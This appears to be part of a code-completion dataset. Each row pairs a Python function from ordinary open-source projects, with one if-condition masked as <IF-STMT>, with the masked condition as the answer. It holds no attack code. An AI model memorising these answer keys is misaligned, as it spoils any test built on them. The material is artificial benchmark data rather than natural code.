995,"def got_shares(self, shares):<tab>if self.check_reneging:<tab><tab><IF-STMT><tab><tab><tab>self.finished_d.errback(<tab><tab><tab><tab>unittest.FailTest(<tab><tab><tab><tab><tab>""The node was told by the share finder that it is destined to remain hungry, then was given another share.""<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab><tab>return<tab>self.got += len(shares)<tab>log.msg(""yyy 3 %s.got_shares(%s) got: %s"" % (self, shares, self.got))<tab>if self.got == 3:<tab><tab>self.finished_d.callback(True)",if self . _no_more_shares :,167
996,"def get_class_obj_(self, node, default_class=None):<tab>class_obj1 = default_class<tab>if ""xsi"" in node.nsmap:<tab><tab>classname = node.get(""{%s}type"" % node.nsmap[""xsi""])<tab><tab>if classname is not None:<tab><tab><tab>names = classname.split("":"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>classname = names[1]<tab><tab><tab>class_obj2 = globals().get(classname)<tab><tab><tab>if class_obj2 is not None:<tab><tab><tab><tab>class_obj1 = class_obj2<tab>return class_obj1",if len ( names ) == 2 :,154
997,"def update(self, mapping, update_only=False):<tab>for name in mapping:<tab><tab><IF-STMT><tab><tab><tab># nested and inner objects, merge recursively<tab><tab><tab>if hasattr(self[name], ""update""):<tab><tab><tab><tab># FIXME only merge subfields, not the settings<tab><tab><tab><tab>self[name].update(mapping[name], update_only)<tab><tab><tab>continue<tab><tab>self.field(name, mapping[name])<tab>if update_only:<tab><tab>for name in mapping._meta:<tab><tab><tab>if name not in self._meta:<tab><tab><tab><tab>self._meta[name] = mapping._meta[name]<tab>else:<tab><tab>self._meta.update(mapping._meta)",if update_only and name in self :,175
998,"def configure(self):<tab>super(Command, self).configure()<tab>if self.needs_config and not self.resolver:<tab><tab># Checking if a default config file is present<tab><tab><IF-STMT><tab><tab><tab>self.add_option(<tab><tab><tab><tab>""config"", ""c"", InputOption.VALUE_REQUIRED, ""The config file path""<tab><tab><tab>)",if not self . _check_config ( ) :,92
999,"def is_metric(cls, key_type, comparator):<tab>if key_type == cls._METRIC_IDENTIFIER:<tab><tab><IF-STMT><tab><tab><tab>raise MlflowException(<tab><tab><tab><tab>""Invalid comparator '%s' ""<tab><tab><tab><tab>""not one of '%s"" % (comparator, cls.VALID_METRIC_COMPARATORS),<tab><tab><tab><tab>error_code=INVALID_PARAMETER_VALUE,<tab><tab><tab>)<tab><tab>return True<tab>return False",if comparator not in cls . VALID_METRIC_COMPARATORS :,126
1000,"def get_full_qualified_name(self, node: Element) -> str:<tab>if node.get(""reftype"") == ""option"":<tab><tab>progname = node.get(""std:program"")<tab><tab>command = ws_re.split(node.get(""reftarget""))<tab><tab>if progname:<tab><tab><tab>command.insert(0, progname)<tab><tab>option = command.pop()<tab><tab><IF-STMT><tab><tab><tab>return ""."".join([""-"".join(command), option])<tab><tab>else:<tab><tab><tab>return None<tab>else:<tab><tab>return None",if command :,133
1001,"def log_unsupported(logger, message, dictionary):<tab>if len(dictionary) < 1:<tab><tab>return<tab># Display unsupported service list<tab>logger.info(message, len(dictionary))<tab># Display individual warnings for each service<tab>for service in dictionary.keys():<tab><tab><IF-STMT><tab><tab><tab>logger.info(""Ignoring service: %s"" % service)<tab><tab><tab>continue<tab><tab># Log unsupported service warning<tab><tab>logger.warn(<tab><tab><tab>""Unsupported service: %s"" % service,<tab><tab><tab>extra={<tab><tab><tab><tab>""event"": {<tab><tab><tab><tab><tab>""module"": __name__,<tab><tab><tab><tab><tab>""name"": ""unsupported_service"",<tab><tab><tab><tab><tab>""key"": service,<tab><tab><tab><tab>}<tab><tab><tab>},<tab><tab>)",if service is None or service in IGNORED_SERVICES :,197
1002,"def encode_password(pw):<tab>""""""Encode password in hexadecimal if needed""""""<tab>enc = False<tab>if pw:<tab><tab>encPW = __PW_PREFIX<tab><tab>for c in pw:<tab><tab><tab>cnum = ord(c)<tab><tab><tab>if c == ""#"" or cnum < 33 or cnum > 126:<tab><tab><tab><tab>enc = True<tab><tab><tab>encPW += ""%2x"" % cnum<tab><tab><IF-STMT><tab><tab><tab>return encPW<tab>return pw",if enc :,115
1003,"def matrix_min_and_max(matrix):<tab>_min = None<tab>_max = None<tab>for row in matrix:<tab><tab>for el in row:<tab><tab><tab>val = el<tab><tab><tab>if _min is None or val < _min:<tab><tab><tab><tab>_min = val<tab><tab><tab><IF-STMT><tab><tab><tab><tab>_max = val<tab>return _min, _max",if _max is None or val > _max :,102
1004,"def __init__(self, content=None, parent=None):<tab>Transformable.__init__(self, content, parent)<tab>self._items = []<tab>for element in content:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>tag = element.tag[len(namespace) :]<tab><tab>if tag == ""g"":<tab><tab><tab>item = Group(element, self)<tab><tab>elif tag == ""path"":<tab><tab><tab>item = Path(element, self)<tab><tab>else:<tab><tab><tab>log.warn(""Unhandled SVG tag (%s)"" % tag)<tab><tab><tab>continue<tab><tab>self._items.append(item)",if not element . tag . startswith ( namespace ) :,154
1005,def reset_appid(self):<tab># called by web_control<tab>with self.lock:<tab><tab>self.working_appid_list = list()<tab><tab>for appid in self.config.GAE_APPIDS:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.config.GAE_APPIDS.remove(appid)<tab><tab><tab><tab>continue<tab><tab><tab>self.working_appid_list.append(appid)<tab><tab>self.not_exist_appids = []<tab><tab>self.out_of_quota_appids = []<tab>self.last_reset_time = time.time(),if not appid :,152
1006,"def find_widget(self, pos):<tab>for widget in self.subwidgets[::-1]:<tab><tab>if widget.visible:<tab><tab><tab>r = widget.rect<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return widget.find_widget(subtract(pos, r.topleft))<tab>return self",if r . collidepoint ( pos ) :,77
1007,"def _get_names(dirs):<tab>""""""Get alphabet and label names, union across all dirs.""""""<tab>alphabets = set()<tab>label_names = {}<tab>for d in dirs:<tab><tab>for example in _walk_omniglot_dir(d):<tab><tab><tab>alphabet, alphabet_char_id, label, _, _ = example<tab><tab><tab>alphabets.add(alphabet)<tab><tab><tab>label_name = ""%s_%d"" % (alphabet, alphabet_char_id)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>assert label_names[label] == label_name<tab><tab><tab>else:<tab><tab><tab><tab>label_names[label] = label_name<tab>label_names = [label_names[k] for k in sorted(label_names)]<tab>return alphabets, label_names",if label in label_names :,196
1008,"def model():<tab>with pyro.plate_stack(""plates"", shape):<tab><tab>with pyro.plate(""particles"", 200000):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>pyro.sample(""x"", dist.Normal(loc, scale))<tab><tab><tab>else:<tab><tab><tab><tab>pyro.sample(""x"", dist.StudentT(10.0, loc, scale))","if ""dist_type"" == ""Normal"" :",103
1009,"def set_note_pinned(self, key, pinned):<tab>n = self.notes[key]<tab>old_pinned = utils.note_pinned(n)<tab>if pinned != old_pinned:<tab><tab>if ""systemtags"" not in n:<tab><tab><tab>n[""systemtags""] = []<tab><tab>systemtags = n[""systemtags""]<tab><tab><IF-STMT><tab><tab><tab># which by definition means that it was NOT pinned<tab><tab><tab>systemtags.append(""pinned"")<tab><tab>else:<tab><tab><tab>systemtags.remove(""pinned"")<tab><tab>n[""modifydate""] = time.time()<tab><tab>self.notify_observers(<tab><tab><tab>""change:note-status"",<tab><tab><tab>events.NoteStatusChangedEvent(what=""modifydate"", key=key),<tab><tab>)",if pinned :,186
1010,"def __init__(self, name, contents):<tab>self.name = name<tab>self.all_entries = []<tab>self.attr = []<tab>self.child = []<tab>self.seq_child = []<tab>for entry in contents:<tab><tab>clean_entry = entry.rstrip(""*"")<tab><tab>self.all_entries.append(clean_entry)<tab><tab>if entry.endswith(""**""):<tab><tab><tab>self.seq_child.append(clean_entry)<tab><tab><IF-STMT><tab><tab><tab>self.child.append(clean_entry)<tab><tab>else:<tab><tab><tab>self.attr.append(entry)","elif entry . endswith ( ""*"" ) :",147
1011,"def testToFileBinary(self):<tab>z = dns.zone.from_file(here(""example""), ""example"")<tab>try:<tab><tab>f = open(here(""example3-binary.out""), ""wb"")<tab><tab>z.to_file(f)<tab><tab>f.close()<tab><tab>ok = filecmp.cmp(here(""example3-binary.out""), here(""example3.good""))<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>os.unlink(here(""example3-binary.out""))<tab>self.failUnless(ok)",if not _keep_output :,133
1012,"def test_collect_gradients_with_allreduce_failure_case(self):<tab>worker = self._workers[1]<tab>train_db, _ = get_mnist_dataset(self._batch_size)<tab>for step, (x, y) in enumerate(train_db):<tab><tab>if step == 0:<tab><tab><tab>worker._run_model_call_before_training(x)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>self.assertEqual(<tab><tab><tab>worker._calculate_grads_and_report_with_allreduce(None),<tab><tab><tab>False,<tab><tab><tab>""Should fail when no data is received"",<tab><tab>)",if step == self . _test_steps :,160
1013,"def clean(self):<tab>data = self.cleaned_data<tab>number, ccv = data.get(""number""), data.get(""ccv"")<tab>if number and ccv:<tab><tab><IF-STMT><tab><tab><tab>raise forms.ValidationError(<tab><tab><tab><tab>_(""American Express cards use a 4 digit security code"")<tab><tab><tab>)<tab>return data",if bankcards . is_amex ( number ) and len ( ccv ) != 4 :,104
1014,"def _gen_GreaterEqual(self, args, ret_type):<tab>result = []<tab>for lhs, rhs in pairwise(args):<tab><tab><IF-STMT><tab><tab><tab>result.append(self.builder.fcmp_ordered("">="", lhs, rhs))<tab><tab>elif ret_type == int_type:<tab><tab><tab>result.append(self.builder.icmp_signed("">="", lhs, rhs))<tab><tab>else:<tab><tab><tab>raise CompileError()<tab>return reduce(self.builder.and_, result)",if ret_type == real_type :,120
1015,"def console_get(context, console_id, instance_id=None):<tab>query = (<tab><tab>model_query(context, models.Console, read_deleted=""yes"")<tab><tab>.filter_by(id=console_id)<tab><tab>.options(joinedload(""pool""))<tab>)<tab>if instance_id is not None:<tab><tab>query = query.filter_by(instance_id=instance_id)<tab>result = query.first()<tab>if not result:<tab><tab><IF-STMT><tab><tab><tab>raise exception.ConsoleNotFoundForInstance(<tab><tab><tab><tab>console_id=console_id, instance_id=instance_id<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>raise exception.ConsoleNotFound(console_id=console_id)<tab>return result",if instance_id :,185
1016,"def publish():<tab>pub = await aioredis.create_redis((""localhost"", 6379))<tab>while not tsk.done():<tab><tab># wait for clients to subscribe<tab><tab>while True:<tab><tab><tab>subs = await pub.pubsub_numsub(""channel:1"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>await asyncio.sleep(0, loop=loop)<tab><tab># publish some messages<tab><tab>for msg in [""one"", ""two"", ""three""]:<tab><tab><tab>await pub.publish(""channel:1"", msg)<tab><tab># send stop word<tab><tab>await pub.publish(""channel:1"", STOPWORD)<tab>pub.close()<tab>await pub.wait_closed()","if subs [ b""channel:1"" ] == 1 :",176
1017,"def read(self, size=None):<tab>if not size:<tab><tab>size = self._size<tab><tab>contents = BytesIO()<tab><tab>while True:<tab><tab><tab>blocks = GzipFile.read(self, size)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>contents.flush()<tab><tab><tab><tab>break<tab><tab><tab>contents.write(blocks)<tab><tab>return contents.getvalue()<tab>else:<tab><tab>return GzipFile.read(self, size)",if not blocks :,108
1018,"def i2repr(self, pkt, x):<tab>if type(x) is list or type(x) is tuple:<tab><tab>return repr(x)<tab>if self.multi:<tab><tab>r = []<tab>else:<tab><tab>r = """"<tab>i = 0<tab>while x:<tab><tab><IF-STMT><tab><tab><tab>if self.multi:<tab><tab><tab><tab>r += [self.names[i]]<tab><tab><tab>else:<tab><tab><tab><tab>r += self.names[i]<tab><tab>i += 1<tab><tab>x >>= 1<tab>if self.multi:<tab><tab>r = ""+"".join(r)<tab>return r",if x & 1 :,154
1019,"def _run(self):<tab>while not self.stopped:<tab><tab># Prevent calling bus.send from multiple threads<tab><tab>with self.lock:<tab><tab><tab>started = time.time()<tab><tab><tab>try:<tab><tab><tab><tab>self.bus.send(self.message)<tab><tab><tab>except Exception as exc:<tab><tab><tab><tab>log.exception(exc)<tab><tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab># Compensate for the time it takes to send the message<tab><tab>delay = self.period - (time.time() - started)<tab><tab>time.sleep(max(0.0, delay))",if self . end_time is not None and time . time ( ) >= self . end_time :,169
1020,"def currentLevel(self):<tab>currentStr = """"<tab>for stackType, stackValue in self.stackVals:<tab><tab>if stackType == ""dict"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>currentStr += ""['"" + stackValue + ""']""<tab><tab><tab>else:  # numeric key...<tab><tab><tab><tab>currentStr += ""["" + str(stackValue) + ""]""<tab><tab>elif stackType == ""listLike"":<tab><tab><tab>currentStr += ""["" + str(stackValue) + ""]""<tab><tab>elif stackType == ""getattr"":<tab><tab><tab>currentStr += "".__getattribute__('"" + stackValue + ""')""<tab><tab>else:<tab><tab><tab>raise Exception(f""Cannot get attribute of type {stackType}"")<tab>return currentStr","if isinstance ( stackValue , str ) :",176
1021,"def restoreParent(self):<tab>if self.sid.isRoot:<tab><tab>return<tab>with self.suspendMouseButtonNavigation():<tab><tab>confirm, opt = self.confirmRestore((self.path,))<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>if opt[""delete""] and not self.confirmDelete(warnRoot=self.path == ""/""):<tab><tab><tab>return<tab>rd = RestoreDialog(self, self.sid, self.path, **opt)<tab>rd.exec()",if not confirm :,114
1022,"def keep_vocab_item(word, count, min_count, trim_rule=None):<tab>default_res = count >= min_count<tab>if trim_rule is None:<tab><tab>return default_res<tab>else:<tab><tab>rule_res = trim_rule(word, count, min_count)<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>elif rule_res == RULE_DISCARD:<tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>return default_res",if rule_res == RULE_KEEP :,125
1023,"def _get_cuda_device(*args):<tab># Returns cuda.Device or DummyDevice.<tab>for arg in args:<tab><tab>if type(arg) is not bool and isinstance(arg, _integer_types):<tab><tab><tab>check_cuda_available()<tab><tab><tab>return Device(arg)<tab><tab><IF-STMT><tab><tab><tab>if arg.device is None:<tab><tab><tab><tab>continue<tab><tab><tab>return arg.device<tab><tab>if available and isinstance(arg, Device):<tab><tab><tab>return arg<tab># NOTE: This function returns DummyDevice for both NumPy and ChainerX<tab>return DummyDevice","if isinstance ( arg , ndarray ) :",144
1024,"def __init__(<tab>self,<tab>filename,<tab>metadata_name,<tab>metadata_column,<tab>message=""Value for metadata not found."",<tab>line_startswith=None,<tab>split=""\t"",):<tab>self.metadata_name = metadata_name<tab>self.message = message<tab>self.valid_values = []<tab>for line in open(filename):<tab><tab>if line_startswith is None or line.startswith(line_startswith):<tab><tab><tab>fields = line.split(split)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.valid_values.append(fields[metadata_column].strip())",if metadata_column < len ( fields ) :,150
1025,"def FindEnclosingBracketGroup(input_str):<tab>stack = []<tab>start = -1<tab>for index, char in enumerate(input_str):<tab><tab>if char in LBRACKETS:<tab><tab><tab>stack.append(char)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>start = index<tab><tab>elif char in BRACKETS:<tab><tab><tab>if not stack:<tab><tab><tab><tab>return (-1, -1)<tab><tab><tab>if stack.pop() != BRACKETS[char]:<tab><tab><tab><tab>return (-1, -1)<tab><tab><tab>if not stack:<tab><tab><tab><tab>return (start, index + 1)<tab>return (-1, -1)",if start == - 1 :,163
1026,"def _on_message(self, msg: str) -> None:<tab>obj = json.loads(msg)<tab>_id = obj.get(""id"")<tab>if _id and _id in self._callbacks:<tab><tab>callback = self._callbacks.pop(_id)<tab><tab><IF-STMT><tab><tab><tab>error = obj[""error""]<tab><tab><tab>msg = error.get(""message"")<tab><tab><tab>data = error.get(""data"")<tab><tab><tab>callback.set_exception(NetworkError(f""Protocol Error: {msg} {data}""))<tab><tab>else:<tab><tab><tab>result = obj.get(""result"")<tab><tab><tab>callback.set_result(result)<tab>else:<tab><tab>self.emit(obj.get(""method""), obj.get(""params""))","if ""error"" in obj :",183
1027,"def _get_containers_with_state(self, container_names, select_random, *container_states):<tab>containers = self._get_all_containers()<tab>candidates = dict((c.name, c) for c in containers if c.status in container_states)<tab>if select_random and candidates:<tab><tab>return [random.choice(list(candidates.values()))]<tab>if container_names is None:<tab><tab>return list(candidates.values())<tab>found = []<tab>for name in container_names:<tab><tab>container = candidates.get(name)<tab><tab><IF-STMT><tab><tab><tab>raise BlockadeError(<tab><tab><tab><tab>""Container %s is not found or not any of %s"" % (name, container_states)<tab><tab><tab>)<tab><tab>found.append(container)<tab>return found",if not container :,193
1028,"def __eq__(self, other):<tab>if isinstance(other, WeakMethod):<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab># check also if either instance is None or else if instances are equal<tab><tab>if self.instance is None:<tab><tab><tab>return other.instance is None<tab><tab>else:<tab><tab><tab>return self.instance() == other.instance()<tab>elif callable(other):<tab><tab>return self == WeakMethod(other)<tab>else:<tab><tab>return False",if self . function != other . function :,120
1029,"def last_bottle_hash():<tab>""""""Fetch the bottle do ... end from the latest brew formula""""""<tab>resp = requests.get(HOMEBREW_FORMULAR_LATEST)<tab>resp.raise_for_status()<tab>lines = resp.text.split(""\n"")<tab>look_for_end = False<tab>start = 0<tab>end = 0<tab>for idx, content in enumerate(lines):<tab><tab>if look_for_end:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>end = idx<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>if ""bottle do"" in content:<tab><tab><tab><tab>start = idx<tab><tab><tab><tab>look_for_end = True<tab>return ""\n"".join(lines[start : end + 1])","if ""end"" in content :",184
1030,"def wrapper(fn):<tab>if debug_run_test_calls:<tab><tab>ret = str(fn(*args, *kwargs))<tab><tab>print(""TEST: %s()"" % fn.__name__)<tab><tab><IF-STMT><tab><tab><tab>print(""  arg:"", args)<tab><tab>if kwargs:<tab><tab><tab>print(""  kwa:"", kwargs)<tab><tab>print(""  ret:"", ret)<tab>return fn",if args :,95
1031,"def parse_socket_line(line):<tab>lsp = line.strip().split()<tab>if not len(lsp) in {3, 5}:<tab><tab>print(line, ""is malformed"")<tab><tab>return UNPARSABLE<tab>else:<tab><tab>socket_type = sock_dict.get(lsp[2])<tab><tab>socket_name = lsp[1]<tab><tab><IF-STMT><tab><tab><tab>return UNPARSABLE<tab><tab>elif len(lsp) == 3:<tab><tab><tab>return socket_type, socket_name, None, None<tab><tab>else:<tab><tab><tab>default = processed(lsp[3])<tab><tab><tab>nested = processed(lsp[4])<tab><tab><tab>return socket_type, socket_name, default, nested",if not socket_type :,182
1032,"def release(self):<tab>me, lock_count = self.__begin()<tab>try:<tab><tab>if me is None:<tab><tab><tab>return<tab><tab>self._count = count = self._count - 1<tab><tab><IF-STMT><tab><tab><tab>self._owner = None<tab><tab><tab>self._block.release()<tab>finally:<tab><tab>self.__end(me, lock_count)",if not count :,92
1033,"def Traverse(self):<tab>""""""A generator for _IMAGE_RESOURCE_DATA_ENTRY under this node.""""""<tab>for entry in self:<tab><tab><IF-STMT><tab><tab><tab>for subentry in entry.Entry.Traverse():<tab><tab><tab><tab>yield subentry<tab><tab>else:<tab><tab><tab>yield entry.OffsetToData.dereference()",if entry . ChildIsEntry :,83
1034,"def getInstances_WithSource(self, instancesAmount, sourceObject, scenes):<tab>if sourceObject is None:<tab><tab>self.removeAllObjects()<tab><tab>return []<tab>else:<tab><tab>sourceHash = hash(sourceObject)<tab><tab><IF-STMT><tab><tab><tab>if lastSourceHashes[self.identifier] != sourceHash:<tab><tab><tab><tab>self.removeAllObjects()<tab><tab>lastSourceHashes[self.identifier] = sourceHash<tab>return self.getInstances_Base(instancesAmount, sourceObject, scenes)",if self . identifier in lastSourceHashes :,132
1035,"def used_pos():<tab>pos_along_edges = []<tab>for e in edges:<tab><tab>A, B = pos[e[0]], pos[e[1]]<tab><tab><IF-STMT>  # Y-axis edge.<tab><tab><tab>for i in range(A[1], B[1], np.sign(B[1] - A[1])):<tab><tab><tab><tab>pos_along_edges.append((A[0], i))<tab><tab>else:  # X-axis edge.<tab><tab><tab>for i in range(A[0], B[0], np.sign(B[0] - A[0])):<tab><tab><tab><tab>pos_along_edges.append((i, A[1]))<tab>return list(pos.values()) + pos_along_edges",if A [ 0 ] == B [ 0 ] :,186
1036,"def __init__(<tab>self, plugin_name=None, builtin=False, deprecated=False, config=None, session=None):<tab>if builtin and isinstance(builtin, (str, unicode)):<tab><tab>builtin = os.path.basename(builtin)<tab><tab>for ignore in ("".py"", "".pyo"", "".pyc""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>builtin = builtin[: -len(ignore)]<tab><tab>if builtin not in self.LOADED:<tab><tab><tab>self.LOADED.append(builtin)<tab>self.loading_plugin = plugin_name<tab>self.loading_builtin = plugin_name and builtin<tab>self.builtin = builtin<tab>self.deprecated = deprecated<tab>self.session = session<tab>self.config = config<tab>self.manifests = []",if builtin . endswith ( ignore ) :,181
1037,def input(self):<tab><IF-STMT><tab><tab>self.lazy_init_lock_.acquire()<tab><tab>try:<tab><tab><tab>if self.input_ is None:<tab><tab><tab><tab>self.input_ = InputSettings()<tab><tab>finally:<tab><tab><tab>self.lazy_init_lock_.release()<tab>return self.input_,if self . input_ is None :,85
1038,"def _shares_in_results(data):<tab>shares_in_device, shares_in_subdevice = False, False<tab>for plugin_name, plugin_result in data.iteritems():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if ""device"" not in plugin_result:<tab><tab><tab>continue<tab><tab>if ""disk_shares"" in plugin_result[""device""]:<tab><tab><tab>shares_in_device = True<tab><tab>for subdevice in plugin_result[""device""].get(""subdevices"", []):<tab><tab><tab>if ""disk_shares"" in subdevice:<tab><tab><tab><tab>shares_in_subdevice = True<tab><tab><tab><tab>break<tab>return shares_in_device, shares_in_subdevice","if plugin_result [ ""status"" ] == ""error"" :",175
1039,"def m2i(self, pkt, x):<tab>res = []<tab>while x:<tab><tab>cur = []<tab><tab># while x and x[0] != b'\x00':<tab><tab>while x and x[0] != 0:<tab><tab><tab>l = x[0]<tab><tab><tab>cur.append(x[1 : l + 1])<tab><tab><tab>x = x[l + 1 :]<tab><tab>res.append(b""."".join(cur))<tab><tab><IF-STMT><tab><tab><tab>x = x[1:]<tab>return res",if x and x [ 0 ] == 0 :,137
1040,"def generate_idempotent_uuid(params, model, **kwargs):<tab>for name in model.idempotent_members:<tab><tab><IF-STMT><tab><tab><tab>params[name] = str(uuid.uuid4())<tab><tab><tab>logger.debug(<tab><tab><tab><tab>""injecting idempotency token (%s) into param '%s'.""<tab><tab><tab><tab>% (params[name], name)<tab><tab><tab>)",if name not in params :,100
1041,"def __init__(self, name, signatures, kind, vm):<tab>super().__init__(name, vm)<tab>assert signatures<tab>self.kind = kind<tab>self.bound_class = BoundPyTDFunction<tab>self.signatures = signatures<tab>self._signature_cache = {}<tab>self._return_types = {sig.pytd_sig.return_type for sig in signatures}<tab>for sig in signatures:<tab><tab>for param in sig.pytd_sig.params:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._has_mutable = True<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>self._has_mutable = False<tab>for sig in signatures:<tab><tab>sig.function = self<tab><tab>sig.name = self.name",if param . mutated_type is not None :,183
1042,"def sub_dict(d):<tab>r = {}<tab>for k in d:<tab><tab>if type(d[k]) in prims:<tab><tab><tab>r[k] = d[k]<tab><tab><IF-STMT><tab><tab><tab>r[k] = sub_list(d[k])<tab><tab>elif type(d[k]) is dict:<tab><tab><tab>r[k] = sub_dict(d[k])<tab><tab>else:<tab><tab><tab>print(""Unknown Type: {}"".format(type(d[k])))<tab>return r",elif type ( d [ k ] ) is list :,134
1043,"def listAdd():<tab>cpe = request.args.get(""cpe"")<tab>cpeType = request.args.get(""type"")<tab>lst = request.args.get(""list"")<tab>if cpe and cpeType and lst:<tab><tab>status = (<tab><tab><tab>""added_to_list""<tab><tab><tab><IF-STMT><tab><tab><tab>else ""already_exists_in_list""<tab><tab>)<tab><tab>returnList = db.getWhitelist() if lst == ""whitelist"" else db.getBlacklist()<tab><tab>return jsonify({""status"": status, ""rules"": returnList, ""listType"": lst.title()})<tab>else:<tab><tab>return jsonify({""status"": ""could_not_add_to_list""})","if addCPEToList ( cpe , lst , cpeType )",184
1044,"def _integrate_fixed_trajectory(self, h, T, step, relax):<tab>""""""Generates a solution trajectory of fixed length.""""""<tab># initialize the solution using initial condition<tab>solution = np.hstack((self.t, self.y))<tab>while self.successful():<tab><tab>self.integrate(self.t + h, step, relax)<tab><tab>current_step = np.hstack((self.t, self.y))<tab><tab>solution = np.vstack((solution, current_step))<tab><tab>if (h > 0) and (self.t >= T):<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>continue<tab>return solution",elif ( h < 0 ) and ( self . t <= T ) :,174
1045,"def transform(self, X):<tab>if self.preprocessor is None:<tab><tab>raise NotImplementedError()<tab>with warnings.catch_warnings():<tab><tab>warnings.filterwarnings(""error"")<tab><tab>X_new = self.preprocessor.transform(X)<tab><tab># TODO write a unittest for this case<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""KernelPCA removed all features!"")<tab><tab>return X_new",if X_new . shape [ 1 ] == 0 :,102
1046,"def playerData(s):<tab>""""""Returns a list of tuples of original string and dict of values""""""<tab>p = []<tab>i = 0<tab>while True:<tab><tab>match = re_input.match(s, pos=i)<tab><tab><IF-STMT><tab><tab><tab>return p<tab><tab>else:<tab><tab><tab>d = match.groupdict()<tab><tab><tab>if d[""args""] is not None:<tab><tab><tab><tab>d[""degree""], d[""kwargs""] = getArgs(d[""args""])<tab><tab><tab>else:<tab><tab><tab><tab>d[""degree""], d[""kwargs""] = """", {}<tab><tab><tab>del d[""args""]<tab><tab><tab>p.append((match.group().strip(), d))<tab><tab><tab>i = match.end()<tab>return",if match is None :,178
1047,"def extract_deps(file):<tab># ~ print('Extracting from %s' % file)<tab>deps = set()<tab>for line in open(file).readlines():<tab><tab>line = line.strip()<tab><tab>if line.startswith(""import"") or line.startswith(""from""):<tab><tab><tab>words = line.split()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>deps.add(words[1])<tab>return deps","if words [ 0 ] == ""import"" or ( words [ 0 ] == ""from"" and words [ 2 ] == ""import"" ) :",124
1048,"def _remove_optional_none_type_hints(self, type_hints, defaults):<tab># If argument has None as a default, typing.get_type_hints adds<tab># optional None to the information it returns. We don't want that.<tab>for arg in defaults:<tab><tab><IF-STMT><tab><tab><tab>type_ = type_hints[arg]<tab><tab><tab>if self._is_union(type_):<tab><tab><tab><tab>types = type_.__args__<tab><tab><tab><tab>if len(types) == 2 and types[1] is type(None):<tab><tab><tab><tab><tab>type_hints[arg] = types[0]",if defaults [ arg ] is None and arg in type_hints :,157
1049,"def _gaf10iterator(handle):<tab>for inline in handle:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>inrec = inline.rstrip(""\n"").split(""\t"")<tab><tab>if len(inrec) == 1:<tab><tab><tab>continue<tab><tab>inrec[3] = inrec[3].split(""|"")  # Qualifier<tab><tab>inrec[5] = inrec[5].split(""|"")  # DB:reference(s)<tab><tab>inrec[7] = inrec[7].split(""|"")  # With || From<tab><tab>inrec[10] = inrec[10].split(""|"")  # Synonym<tab><tab>inrec[12] = inrec[12].split(""|"")  # Taxon<tab><tab>yield dict(zip(GAF10FIELDS, inrec))","if inline [ 0 ] == ""!"" :",188
1050,"def cvePluginInfo(self, cve, **args):<tab>cveInfo = []<tab>for plugin in self.getWebPlugins():<tab><tab>try:<tab><tab><tab>data = plugin.cvePluginInfo(cve, **args)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>cveInfo.append(data)<tab><tab>except Exception as e:<tab><tab><tab>print(<tab><tab><tab><tab>""[!] Plugin %s failed on fetching CVE plugin info!"" % plugin.getName()<tab><tab><tab>)<tab><tab><tab>print(""[!]  -> %s"" % e)<tab>return cveInfo","if type ( data ) == dict and ""title"" in data and ""data"" in data :",158
1051,"def testLastContainerMarker(self):<tab>for format in [None, ""json"", ""xml""]:<tab><tab>containers = self.env.account.containers({""format"": format})<tab><tab>self.assertEquals(len(containers), len(self.env.containers))<tab><tab>self.assert_status(200)<tab><tab>containers = self.env.account.containers(<tab><tab><tab>parms={""format"": format, ""marker"": containers[-1]}<tab><tab>)<tab><tab>self.assertEquals(len(containers), 0)<tab><tab><IF-STMT><tab><tab><tab>self.assert_status(204)<tab><tab>else:<tab><tab><tab>self.assert_status(200)",if format is None :,155
1052,"def _make_input_layers(self, rebuild=False):<tab>for name, layer in self.layer_map.items():<tab><tab>layer.left_in_edges = len(layer.in_edges)<tab><tab>if len(layer.in_edges) == 0:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if not layer.get_attr(""scope""):<tab><tab><tab><tab><tab>self.input_layers.append(name)<tab><tab><tab>else:<tab><tab><tab><tab>self.input_layers.append(name)",if rebuild :,123
1053,"def widget_attrs(self, widget):<tab>attrs = super(IntegerField, self).widget_attrs(widget)<tab>if isinstance(widget, NumberInput):<tab><tab><IF-STMT><tab><tab><tab>attrs[""min""] = self.min_value<tab><tab>if self.max_value is not None:<tab><tab><tab>attrs[""max""] = self.max_value<tab>return attrs",if self . min_value is not None :,94
1054,"def _get_outfile(self):<tab>outfile = self.inputs.transformed_file<tab>if not isdefined(outfile):<tab><tab>if self.inputs.inverse is True:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>src = ""orig.mgz""<tab><tab><tab>else:<tab><tab><tab><tab>src = self.inputs.target_file<tab><tab>else:<tab><tab><tab>src = self.inputs.source_file<tab><tab>outfile = fname_presuffix(src, newpath=os.getcwd(), suffix=""_warped"")<tab>return outfile",if self . inputs . fs_target is True :,134
